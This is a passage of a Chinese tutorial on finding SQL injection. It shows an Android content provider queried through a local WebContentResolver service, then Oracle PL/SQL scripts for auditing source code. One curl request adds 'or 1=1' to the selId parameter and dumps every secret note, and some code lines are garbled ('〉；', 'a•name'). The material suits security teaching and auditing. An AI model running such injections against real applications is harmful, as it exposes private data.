punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
selectionArgs &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;%&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;selectionArgs &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;%&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将内部字段映射到SearchManager理解的字段&lt;/span&gt;
qBuilder&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setProjectionMap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;NOTE_PROJECTION_MAP&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;SQLiteDatabase&lt;/span&gt; db &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; dbHelper&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getReadableDatabase&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;〉；
&lt;span class=&#34;token comment&#34;&gt;//执行査询&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Cursor&lt;/span&gt; c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; qBuilder&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;db&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; projection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; selection&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; selectionArgs&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sortOrder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;WebContentResolver向所有己经安装的内容提供程序(Content-Provider)暴露了一个Web Service接口。可以用WebContentResolver实用工具列出所有可访问的内容提供程序。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; http://127.0.0.1:8080/list
package: org.sapmentors.sapnoteview
authority: org.sapmentors.sapnoteview.noteprovider
exported: &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;
readPerm: null
writePerm: null&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行查询&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;$ &lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; http://127.0.0.1:8080/query?a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;org.sapmentors.sapnoteview.noteprovider?&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;selName&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;_id&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;seiId&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11223&lt;/span&gt;
Query successful:
Column count: &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
Row count: &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
I	_id &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; suggest_text_l &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; suggest_intent_data
I &lt;span class=&#34;token number&#34;&gt;11223&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; secret text 丨 &lt;span class=&#34;token number&#34;&gt;11223&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#实际SQL语句&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行注入&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$curl&lt;/span&gt; http://127.0.0.1:8080/query?a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;org.sapmentors.sapnoteview, noteprovider?&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;selName&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;_id&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;selId&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l1223%20or%201&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
Query successful:
Column count: &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
Row count: &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; _id &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; suggest_text_l &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;suggest_intent_data
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11223&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; secret text &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11223&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12345&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; secret text &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12345&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;54321&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; super secret text &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;54321&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;98765&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; shhhh secret &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;98765&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#实际SQL语句&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223 or 1=1)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;selName和selId这两个参数易感染，存在SQL注入&lt;/p&gt;
&lt;h4 id=&#34;复查PL-SQL和T-SQL代码&#34;&gt;&lt;a href=&#34;#复查PL-SQL和T-SQL代码&#34; class=&#34;headerlink&#34; title=&#34;复查PL/SQL和T-SQL代码&#34;&gt;&lt;/a&gt;复查PL/SQL和T-SQL代码&lt;/h4&gt;&lt;h5 id=&#34;PL-SQL&#34;&gt;&lt;a href=&#34;#PL-SQL&#34; class=&#34;headerlink&#34; title=&#34;PL/SQL&#34;&gt;&lt;/a&gt;PL/SQL&lt;/h5&gt;&lt;p&gt;Oracle一直深受多种PL/SQL注入漏洞的困扰，这些漏洞位于数据库产品默认安装的内置数据库包的代码中。PL/SQL代码以definer权限执行，是提升权限的攻击者攻击对象。&lt;/p&gt;
&lt;p&gt;存储过程既能够以调用者权限(authid current_user)运行，也能够以存储过程所有者权限 (authid definer)运行。创建存储过程时，可以使用authid子句指定该行为。&lt;/p&gt;
&lt;p&gt;要分析PL/SQL有两种选择&lt;/p&gt;
&lt;h6 id=&#34;一种是将源代码从数据库导出来&#34;&gt;&lt;a href=&#34;#一种是将源代码从数据库导出来&#34; class=&#34;headerlink&#34; title=&#34;一种是将源代码从数据库导出来&#34;&gt;&lt;/a&gt;一种是将源代码从数据库导出来&lt;/h6&gt;&lt;p&gt;可以使用dbms_metadata包实现该目标，可以使用下面SQL*Plus脚本将DDL(Data Definition Language,数据定义语言)语句从Oracle数据库导出来。DDL语句是定义或修改数据结构(比如 表)的SQL语句。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- Purpose: A PL/SQL script to export the DDL code for all database objects ——Version: v 0.0.1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Works against: Oracle 9i, lOg and llg&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Author: Alexander Kornbrust of Red-Database-Security GmbH&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; echo &lt;span class=&#34;token keyword&#34;&gt;off&lt;/span&gt; feed &lt;span class=&#34;token keyword&#34;&gt;off&lt;/span&gt; pages &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; trims &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; term &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; trim &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; linesize &lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt; long &lt;span class=&#34;token number&#34;&gt;500000&lt;/span&gt; head &lt;span class=&#34;token keyword&#34;&gt;off&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; DBMS_METADATA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SET_TRANSFORM_PARAM&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;DBMS_METADATA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SESSION_
TRANSFORM&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;STORAGE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
spool getallunwrapped&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;spool ddl_source_unwrapped.txt&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- create a SQL scripts containing all unwrapped objects&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;select dbms_metadata.get_ddl(&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;object_type&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;,&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;object_name&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;,&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;owner&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;) from dual;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_objects &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; object_id &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; o&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;obj&lt;span class=&#34;token comment&#34;&gt;# from source$ s, obj$ o,user$ u where ((lower(s.source) like &#39;%function%wrapped%&#39;) or (lower (s.source) like &#39;%procedure%wrapped%&#39;) or (lower(s.source) like &#39;%package%wrapped%&#39;)) and o.obj#=s .obj# and u.user#=o.owner#)) where object_type in (&#39;FUNCTION&#39;,	&#39;PROCEDURE&#39;, &#39;PACKAGE&#39;, &#39;TRIGGER&#39;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; owner &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;object_type&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;object_name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- spool a spool off into the spool file.&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;spool off&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
spool &lt;span class=&#34;token keyword&#34;&gt;off&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- generate the DDL_source&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;@getallunwrapped.sql&lt;/span&gt;
quit&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;另一种是构造自己的SQL语句来搜索PL-SQL代码&#34;&gt;&lt;a href=&#34;#另一种是构造自己的SQL语句来搜索PL-SQL代码&#34; class=&#34;headerlink&#34; title=&#34;另一种是构造自己的SQL语句来搜索PL/SQL代码&#34;&gt;&lt;/a&gt;另一种是构造自己的SQL语句来搜索PL/SQL代码&lt;/h6&gt;&lt;p&gt;Oracle在 ALL_SOURCE和DBA_SOURCE视图中存储PL/SQL源代码。可以通过访问两个视图之一的TEXT列实现该目的。最值得关注的是使用了execute immediate或dbms sql函数的代码。Oracle的PL/SQL是区分大小写的，一定要在查询中使用lower(text)函数，它会将文本值转换为小写字母以便LIKE语句能匹配所有可能的情况。&lt;/p&gt;
&lt;p&gt;使用下列SQL语句来获取PL/SQL代码的源&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; owner &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;LOWER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%immediate%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;LOWER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_sql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; owner&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;PLSQL&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这三条语句易受到攻击，未验证的参数传给了危险的函数&lt;/p&gt;
&lt;p&gt;寻找参数复制给局部定义的变量&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; owner &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%:=%||%&#39;&#39;%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SP_STORED_PROCEDURE&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; owner&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYSMAN&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;input直接与SQL字符串相连，可以判断存在SQL注入&lt;/p&gt;
&lt;p&gt;搜索数据库中所有的代码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- Purpose: A PL/SQL script to search the DB for potentially vulnerable &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- PL/SQL code&lt;/span&gt;
—&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; Version: v &lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Works against: Oracle 9i, 10g and llg&lt;/span&gt;
——Author: Alexander Kornbrust &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; Red&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Database&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Security GmbH
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;distinct&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a•name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;authid&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; SQLTEXT &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_source a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;all_procedures b
&lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;
lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%execute%immediate%(%||%)%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_sql%&#39;&lt;/span&gt;
